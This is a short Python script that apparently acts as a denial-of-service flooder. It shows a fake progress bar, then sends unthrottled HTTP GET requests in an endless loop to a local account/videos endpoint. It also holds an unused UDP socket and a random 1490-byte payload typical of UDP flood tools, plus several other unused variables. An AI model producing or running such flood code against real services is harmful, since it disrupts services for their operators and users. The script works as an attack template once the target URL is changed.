import requests
import time
import socket
import random
from datetime import datetime

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
send_bytes = random._urandom(1490)

url = 'http://127.0.0.1:8080/account/videos'

print("[                    ] 0% ")
time.sleep(1)
print("[==========          ] 50%")
time.sleep(1)
print("[====================] 100%")
time.sleep(1)

sent = 0
while True:
    response = requests.get(url)
    sent = sent + 1
    print(f"Sent {sent} packet to {url}, response: {response.status_code}")
